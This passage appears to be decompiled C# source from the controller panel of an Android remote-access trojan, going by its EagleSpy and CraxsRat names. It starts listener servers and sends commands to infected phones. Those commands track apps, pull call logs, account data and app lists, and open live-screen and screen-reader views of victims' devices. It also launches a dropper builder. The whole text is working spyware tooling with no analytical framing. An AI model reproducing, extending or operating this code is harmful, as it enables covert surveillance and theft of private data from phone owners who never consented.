			string[] array = client.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				client.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"MO<*>L",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					client.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	// Token: 0x0600045C RID: 1116 RVA: 0x0006178C File Offset: 0x0005F98C
	private void ToolStripMenuItem20_Click(object sender, EventArgs e)
	{
		if (this.DGVTRK.Rows.Count > 0 && this.DGVTRK.SelectedRows.Count > 0)
		{
			string text = this.DGVTRK.SelectedRows[0].Cells[3].Value.ToString();
			Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
			string[] array = client.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				client.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"MO<*>S>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					client.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	// Token: 0x0600045D RID: 1117 RVA: 0x00002A40 File Offset: 0x00000C40
	private void DrakeUIButtonIcon20_Click(object sender, EventArgs e)
	{
		this.recordsShowpanel.SendToBack();
		this.recordshowtext.Text = "";
	}

	// Token: 0x0600045E RID: 1118 RVA: 0x00061900 File Offset: 0x0005FB00
	private void ToolStripMenuItem21_Click(object sender, EventArgs e)
	{
		if (this.DGVTRK.Rows.Count > 0 && this.DGVTRK.SelectedRows.Count > 0)
		{
			if (Operators.CompareString(this.DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", false) == 0)
			{
				Codes.MyMsgBox("Alert", "this app is not installed on this phone.", false, Resources.error48px);
			}
			else if (Operators.CompareString(this.DGVTRK.SelectedRows[0].Cells[2].Value.ToString(), "Yes", false) != 0)
			{
				Codes.MyMsgBox("Alert", "There are no logs for this app yet.", false, Resources.error48px);
			}
			else
			{
				string text = this.DGVTRK.SelectedRows[0].Cells[4].Value.ToString();
				this.recordshowtext.Text = text;
				this.recordsShowpanel.BringToFront();
			}
		}
	}

	// Token: 0x0600045F RID: 1119 RVA: 0x00061A18 File Offset: 0x0005FC18
	private void ToolStripMenuItem23_Click(object sender, EventArgs e)
	{
		if (this.DGVTRK.Rows.Count > 0 && this.DGVTRK.SelectedRows.Count > 0)
		{
			if (Operators.CompareString(this.DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", false) == 0)
			{
				Codes.MyMsgBox("Alert", "this app is not installed on this phone.", false, Resources.error48px);
			}
			else
			{
				string text = this.DGVTRK.SelectedRows[0].Cells[1].Value.ToString();
				Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
				string[] array = client.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					client.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"MO<*>R>",
						text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						client.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(parametersObjects);
			}
		}
	}

	// Token: 0x06000460 RID: 1120 RVA: 0x00061BDC File Offset: 0x0005FDDC
	private void ToolStripMenuItem19_Click(object sender, EventArgs e)
	{
		if (this.DGVTRK.Rows.Count > 0 && this.DGVTRK.SelectedRows.Count > 0)
		{
			if (Operators.CompareString(this.DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", false) == 0)
			{
				Codes.MyMsgBox("Alert", "this app is not installed on this phone.", false, Resources.error48px);
			}
			else if (this.combodatestrack.Items == null | string.IsNullOrEmpty(this.combodatestrack.Text))
			{
				Codes.MyMsgBox("Alert", "Select Snaps Date.", false, Resources.error48px);
			}
			else
			{
				string text = this.DGVTRK.SelectedRows[0].Cells[1].Value.ToString();
				Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
				string[] array = client.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					client.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"MO<*>G>",
						text,
						">",
						client.ClientRemoteAddress,
						">",
						this.combodatestrack.Text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						client.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(parametersObjects);
			}
		}
	}

	// Token: 0x06000461 RID: 1121 RVA: 0x00061E08 File Offset: 0x00060008
	private void ToolStripMenuItem24_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.Rows.Count > 0 && this.ClientsWindow.SelectedRows.Count > 0)
		{
			Dialog1 dialog = new Dialog1();
			dialog.Title = "Enter App ID";
			dialog.ShowDialog();
			if (dialog.DialogResult == DialogResult.OK)
			{
				string text = dialog.Mytext.Text;
				if (Codes.IsValidPackageName(text) || Codes.MyMsgBox("Alert", "this new ID is not valid as app id\r\nare you sure you want to continue ?", true, Resources.error48px))
				{
					Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
					string[] array = client.Keys.Split(new char[]
					{
						':'
					});
					object[] parametersObjects = new object[]
					{
						client.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"MO<*>A>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							client.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(parametersObjects);
				}
			}
		}
	}

	// Token: 0x06000462 RID: 1122 RVA: 0x00061FB8 File Offset: 0x000601B8
	private void ToolStripMenuItem22_Click(object sender, EventArgs e)
	{
		if (this.DGVTRK.Rows.Count > 0 && this.DGVTRK.SelectedRows.Count > 0)
		{
			if (Operators.CompareString(this.DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", false) == 0)
			{
				Codes.MyMsgBox("Alert", "this app is not installed on this phone.", false, Resources.error48px);
			}
			else if (this.combodatestrack.Items == null | string.IsNullOrEmpty(this.combodatestrack.Text))
			{
				Codes.MyMsgBox("Alert", "Select Snaps Date.", false, Resources.error48px);
			}
			else
			{
				string text = this.DGVTRK.SelectedRows[0].Cells[1].Value.ToString();
				Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
				string[] array = client.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					client.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"MO<*>D>",
						text,
						">",
						this.combodatestrack.Text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						client.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(parametersObjects);
			}
		}
	}

	// Token: 0x06000463 RID: 1123 RVA: 0x000621D0 File Offset: 0x000603D0
	private void ToolStripMenuItem25_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.Rows.Count > 0 && this.ClientsWindow.SelectedRows.Count > 0)
		{
			Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (this.DGFW.Rows.Count != 0)
			{
				if (this.DGFW.SelectedRows.Count == 0)
				{
					EagleAlert.Showinformation("Select app first");
				}
				else
				{
					string text = this.DGFW.SelectedRows[0].Cells[3].Value.ToString();
					string[] array = client.Keys.Split(new char[]
					{
						':'
					});
					object[] parametersObjects = new object[]
					{
						client.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"MO<*>A>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							client.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(parametersObjects);
				}
			}
		}
	}

	// Token: 0x06000464 RID: 1124 RVA: 0x00062384 File Offset: 0x00060584
	private void DGVSERVS_CellClick(object sender, DataGridViewCellEventArgs e)
	{
		if (e.ColumnIndex == 0 && e.RowIndex >= 0)
		{
			string left = this.DGVSERVS.Rows[e.RowIndex].Cells[e.ColumnIndex].Tag.ToString();
			this.DGVSERVS.ClearSelection();
			this.DGVSERVS.CurrentCell = this.DGVSERVS.Rows[e.RowIndex].Cells[0];
			this.DGVSERVS.Rows[e.RowIndex].Selected = true;
			if (Operators.CompareString(left, "OFF", false) == 0)
			{
				EagleSpyMain._Closure_0024__210_002D0 arg = null;
				EagleSpyMain._Closure_0024__210_002D0 CS_0024_003C_003E8__locals0 = new EagleSpyMain._Closure_0024__210_002D0(arg);
				CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
				string path = Application.StartupPath + "\\res\\Config\\Pass.inf";
				CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber = Conversions.ToString(this.DGVSERVS.SelectedRows[0].Tag);
				int port = Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber);
				DataGridViewRow dataGridViewRow = this.DGVSERVS.SelectedRows[0];
				if (dataGridViewRow != null)
				{
					string right = dataGridViewRow.Cells[1].Value.ToString();
					bool flag = false;
					foreach (Accept accept in this.server)
					{
						if (Operators.CompareString(accept.Myport, right, false) == 0)
						{
							flag = true;
							break;
						}
					}
					if (flag)
					{
						EagleAlert.Showinformation("this port is already active");
						return;
					}
				}
				if (!Codes.CheckPort(port))
				{
					Codes.MyMsgBox("Port in use", "this port:" + CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber + "  is used by another program.", false, Resources.warning48px);
					return;
				}
				if (!File.Exists(path))
				{
					File.WriteAllText(path, Codes.Encrypt("X0X0X", Data.THEKEY));
				}
				string[] array = File.ReadAllLines(path);
				if (Operators.CompareString(this.passtxt.Text, Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY), false) != 0)
				{
					if (this.passtxt.Text.Length > 3)
					{
						string text = File.ReadAllText(path);
						text = text.Replace(array.GetValue(0).ToString(), Codes.Encrypt(this.passtxt.Text, Data.THEKEY));
						File.WriteAllText(path, text);
					}
					else if (this.passtxt.Text.Length < 4)
					{
						Codes.MyMsgBox("Warning", "Password Shoud be more Than 3 chars", false, Resources.warning48px);
						return;
					}
				}
				try
				{
					array = File.ReadAllLines(path);
					if (array.GetValue(0).ToString().Length < 3)
					{
						File.WriteAllText(path, Codes.Encrypt("X0X0X", Data.THEKEY));
						Data.password = Codes.AES_Decrypt(Codes.Encrypt("X0X0X", Data.THEKEY), Data.THEKEY);
					}
					else
					{
						Data.password = Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY);
					}
					new Thread(delegate()
					{
						CS_0024_003C_003E8__locals0._0024VB_0024Me.server.Add(new Accept(CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber));
					})
					{
						IsBackground = true
					}.Start();
					this.DGVSERVS.SelectedRows[0].Cells[0].Value = Resources.swtchon;
					this.DGVSERVS.SelectedRows[0].Cells[0].Tag = "ON";
					this.DGVSERVS.SelectedRows[0].Cells[2].Value = "ON";
					this.DGVSERVS.SelectedRows[0].Cells[2].Style.ForeColor = Color.Lime;
					EagleAlert.ShowSucess("Server Start on " + CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber + " Successfully");
					return;
				}
				catch (Exception ex)
				{
					return;
				}
			}
			DataGridViewRow dataGridViewRow2 = this.DGVSERVS.SelectedRows[0];
			if (dataGridViewRow2 != null)
			{
				string text2 = dataGridViewRow2.Cells[1].Value.ToString();
				Accept accept2 = null;
				foreach (Accept accept3 in this.server)
				{
					if (Operators.CompareString(accept3.Myport, text2, false) == 0)
					{
						accept3.MainListner.Server.Close();
						accept3.MainListner.Server.Dispose();
						accept3.MainListner.Stop();
						dataGridViewRow2.Cells[0].Value = Resources.swtchoff;
						dataGridViewRow2.Cells[0].Tag = "OFF";
						dataGridViewRow2.Cells[2].Value = "OFF";
						dataGridViewRow2.Cells[2].Style.ForeColor = Color.Red;
						this.PORTs.Replace(text2 + ">", "");
						accept2 = accept3;
						break;
					}
				}
				if (accept2 != null)
				{
					this.server.Remove(accept2);
					accept2 = null;
				}
			}
		}
	}

	// Token: 0x06000465 RID: 1125 RVA: 0x00062968 File Offset: 0x00060B68
	private void Startserver(DataGridViewCellEventArgs e)
	{
		if (e.ColumnIndex == 0 && e.RowIndex >= 0)
		{
			string left = this.DGVSERVS.Rows[e.RowIndex].Cells[e.ColumnIndex].Tag.ToString();
			this.DGVSERVS.ClearSelection();
			this.DGVSERVS.CurrentCell = this.DGVSERVS.Rows[e.RowIndex].Cells[0];
			this.DGVSERVS.Rows[e.RowIndex].Selected = true;
			if (Operators.CompareString(left, "OFF", false) == 0)
			{
				EagleSpyMain._Closure_0024__210_002D0 arg = null;
				EagleSpyMain._Closure_0024__210_002D0 CS_0024_003C_003E8__locals0 = new EagleSpyMain._Closure_0024__210_002D0(arg);
				CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
				string path = Application.StartupPath + "\\res\\Config\\Pass.inf";
				CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber = Conversions.ToString(this.DGVSERVS.SelectedRows[0].Tag);
				int port = Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber);
				DataGridViewRow dataGridViewRow = this.DGVSERVS.SelectedRows[0];
				if (dataGridViewRow != null)
				{
					string right = dataGridViewRow.Cells[1].Value.ToString();
					bool flag = false;
					foreach (Accept accept in this.server)
					{
						if (Operators.CompareString(accept.Myport, right, false) == 0)
						{
							flag = true;
							break;
						}
					}
					if (flag)
					{
						EagleAlert.Showinformation("this port is already active");
						return;
					}
				}
				if (!Codes.CheckPort(port))
				{
					Codes.MyMsgBox("Port in use", "this port:" + CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber + "  is used by another program.", false, Resources.warning48px);
					return;
				}
				if (!File.Exists(path))
				{
					File.WriteAllText(path, Codes.Encrypt("X0X0X", Data.THEKEY));
				}
				string[] array = File.ReadAllLines(path);
				if (Operators.CompareString(this.passtxt.Text, Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY), false) != 0)
				{
					if (this.passtxt.Text.Length > 3)
					{
						string text = File.ReadAllText(path);
						text = text.Replace(array.GetValue(0).ToString(), Codes.Encrypt(this.passtxt.Text, Data.THEKEY));
						File.WriteAllText(path, text);
					}
					else if (this.passtxt.Text.Length < 4)
					{
						Codes.MyMsgBox("Warning", "Password Shoud be more Than 3 chars", false, Resources.warning48px);
						return;
					}
				}
				try
				{
					array = File.ReadAllLines(path);
					if (array.GetValue(0).ToString().Length < 3)
					{
						File.WriteAllText(path, Codes.Encrypt("X0X0X", Data.THEKEY));
						Data.password = Codes.AES_Decrypt(Codes.Encrypt("X0X0X", Data.THEKEY), Data.THEKEY);
					}
					else
					{
						Data.password = Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY);
					}
					new Thread(delegate()
					{
						CS_0024_003C_003E8__locals0._0024VB_0024Me.server.Add(new Accept(CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber));
					})
					{
						IsBackground = true
					}.Start();
					this.DGVSERVS.SelectedRows[0].Cells[0].Value = Craxs_Rat_Resources.close48px;
					this.DGVSERVS.SelectedRows[0].Cells[0].Tag = "ON";
					this.DGVSERVS.SelectedRows[0].Cells[2].Value = "ON";
					this.DGVSERVS.SelectedRows[0].Cells[2].Style.ForeColor = Color.Lime;
					EagleAlert.ShowSucess("Server Start on " + CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber + " Successfully");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
			DataGridViewRow dataGridViewRow2 = this.DGVSERVS.SelectedRows[0];
			if (dataGridViewRow2 != null)
			{
				string text2 = dataGridViewRow2.Cells[1].Value.ToString();
				Accept accept2 = null;
				foreach (Accept accept3 in this.server)
				{
					if (Operators.CompareString(accept3.Myport, text2, false) == 0)
					{
						accept3.MainListner.Server.Close();
						accept3.MainListner.Server.Dispose();
						accept3.MainListner.Stop();
						dataGridViewRow2.Cells[0].Value = Craxs_Rat_Resources.Abov_mid;
						dataGridViewRow2.Cells[0].Tag = "OFF";
						dataGridViewRow2.Cells[2].Value = "OFF";
						dataGridViewRow2.Cells[2].Style.ForeColor = Color.Red;
						this.PORTs.Replace(text2 + ">", "");
						accept2 = accept3;
						break;
					}
				}
				if (accept2 != null)
				{
					this.server.Remove(accept2);
					accept2 = null;
				}
			}
		}
	}

	// Token: 0x06000466 RID: 1126 RVA: 0x00062F40 File Offset: 0x00061140
	private void Droperbtn_Click(object sender, EventArgs e)
	{
		if (this.DR == null)
		{
			this.DR = new Drooper();
			DialogResult dialogResult = this.DR.ShowDialog(this);
			if (dialogResult != DialogResult.OK)
			{
				this.DR.Close();
				this.DR = null;
			}
			else
			{
				this.DR.Close();
				this.DR = null;
			}
		}
	}

	// Token: 0x06000467 RID: 1127 RVA: 0x00062FA0 File Offset: 0x000611A0
	private void ClientsWindow_CellEndEdit(object sender, DataGridViewCellEventArgs e)
	{
		int width = this.ClientsWindow.Width;
		int height = this.ClientsWindow.Height;
		int num = 0;
		checked
		{
			int num2 = this.ClientsWindow.Columns.Count - 1;
			for (int i = 0; i <= num2; i++)
			{
				num += this.ClientsWindow.Columns[i].Width;
			}
			num += 50;
			this.ClientsWindow.Size = new Size(num, height);
			this.ClientsWindow.Width = num;
			int width2 = this.ClientsWindow.Width;
			int num3 = width2 - width;
			this.DashboardPanel.Width += num3;
		}
	}

	// Token: 0x06000468 RID: 1128 RVA: 0x00063054 File Offset: 0x00061254
	private void Satustimer_Tick(object sender, EventArgs e)
	{
		try
		{
			if (this.ClientsWindow.Rows.Count > 0)
			{
				if (this.ClientsWindow.SelectedRows.Count > 0)
				{
					Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
					if (client == null | !client.isconnected)
					{
						this.TCavatar.Image = null;
						this.uncheckbtn.Visible = false;
						this.clientfoldrbtn.Visible = false;
						this.MonitorPanel.Visible = false;
						this.FWstatus.ForeColor = Color.Red;
						this.DGFW.DataSource = null;
						this.DGVTRK.DataSource = null;
						this.combodatestrack.Items.Clear();
						this.combodatestrack.Text = "";
					}
					else
					{
						Bitmap image = (Bitmap)client.Wallpaper.Clone();
						if (this.TCavatar.Image != null)
						{
							this.TCavatar.Image.Dispose();
						}
						this.TCavatar.Image = image;
						this.uncheckbtn.Visible = true;
						this.clientfoldrbtn.Visible = true;
						client.Row.Cells[12].Value = client.ActiveNow;
						if (client.IsonVPN)
						{
							this.FWstatus.ForeColor = Color.Lime;
						}
						else
						{
							this.FWstatus.ForeColor = Color.Red;
						}
						if (client.FirewallTable != null && client.FirewallTable.Rows.Count > 0)
						{
							this.DGFW.DataSource = client.FirewallTable;
						}
						if (client.TrackedAppsTable != null)
						{
							if (client.TrackedAppsTable.Rows.Count > 0)
							{
								this.DGVTRK.DataSource = client.TrackedAppsTable;
								this.DGVTRK.Columns[4].Visible = false;
							}
							if (client.TrackedDatesFounded != null && this.combodatestrack.Items != null && this.combodatestrack.Items.Count == 0 && client.TrackedDatesFounded.Length != 0)
							{
								string[] trackedDatesFounded = client.TrackedDatesFounded;
								foreach (string item in trackedDatesFounded)
								{
									this.combodatestrack.Items.Add(item);
								}
								this.combodatestrack.Text = Conversions.ToString(this.combodatestrack.Items[0]);
							}
						}
						this.MonitorPanel.Visible = true;
					}
				}
				else
				{
					this.TCavatar.Image = null;
					this.uncheckbtn.Visible = false;
					this.clientfoldrbtn.Visible = false;
					this.MonitorPanel.Visible = false;
					this.FWstatus.ForeColor = Color.Red;
					this.DGFW.DataSource = null;
					this.DGVTRK.DataSource = null;
					this.combodatestrack.Items.Clear();
					this.combodatestrack.Text = "";
				}
			}
			else
			{
				this.DGFW.DataSource = null;
				this.DGVTRK.DataSource = null;
				this.TCavatar.Image = null;
				this.uncheckbtn.Visible = false;
				this.clientfoldrbtn.Visible = false;
				this.MonitorPanel.Visible = false;
				this.FWstatus.ForeColor = Color.Red;
				this.combodatestrack.Items.Clear();
				this.combodatestrack.Text = "";
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000469 RID: 1129 RVA: 0x00063414 File Offset: 0x00061614
	private void UsdtToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "SM_Hunter_" + client.ClientAddressIP;
								Faker faker = (Faker)MyProject.Application.OpenForms[name];
								if (faker == null)
								{
									new Faker
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "SM Hunter", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600046C RID: 1132 RVA: 0x0000206C File Offset: 0x0000026C
	private void label16_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x0600046D RID: 1133 RVA: 0x0000206C File Offset: 0x0000026C
	private void tipkey_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x0600046E RID: 1134 RVA: 0x0005A7E4 File Offset: 0x000589E4
	private void drakeUIButtonIcon13_Click_1(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "SC_Readv2_" + client.ClientAddressIP;
								ScreenReaderV2 screenReaderV = (ScreenReaderV2)MyProject.Application.OpenForms[name];
								if (screenReaderV == null)
								{
									new ScreenReaderV2
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Screen Reader V2", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600046F RID: 1135 RVA: 0x0005A650 File Offset: 0x00058850
	private void drakeUIButtonIcon1_Click_2(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Live_Screen_" + client.ClientRemoteAddress;
								ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
								if (screenShoter == null)
								{
									new ScreenShoter
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Live Screen", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000470 RID: 1136 RVA: 0x0005A4BC File Offset: 0x000586BC
	private void drakeUIButtonIcon22_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".calls",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getCalls,
										Data.SPL_SOCKET,
										"calls"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000471 RID: 1137 RVA: 0x0005A328 File Offset: 0x00058528
	private void drakeUIButtonIcon33_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".info",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.Account,
										Data.SPL_SOCKET,
										"account"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000472 RID: 1138 RVA: 0x0005A1D4 File Offset: 0x000583D4
	private void drakeUIButtonIcon27_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						Client client = (Client)dataGridViewRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[]
							{
								myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".apps",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.Apps,
									Data.SPL_SOCKET,
									"apps"
								}),
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000473 RID: 1139 RVA: 0x0005A96C File Offset: 0x00058B6C
	private void drakeUIButtonIcon12_Click_1(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								int value = 0;
								int value2 = 0;
								if (client.Isv4)
								{
									object[] parametersObjects = new object[]
									{
										myClient,
										string.Concat(new string[]
										{
											SecurityKey.KeysClient2,
											Data.SPL_SOCKET,
											"lcm<*>",
											client.ClientRemoteAddress,
											Data.SPL_SOCKET,
											array[0],
											Data.SPL_SOCKET,
											array[1],
											Data.SPL_SOCKET,
											SecurityKey.Lockscreen,
											Data.SPL_SOCKET,
											Conversions.ToString(value),
											Data.SPL_SOCKET,
											Conversions.ToString(value2),
											Data.SPL_SOCKET,
											Data.SPL_ARRAY,
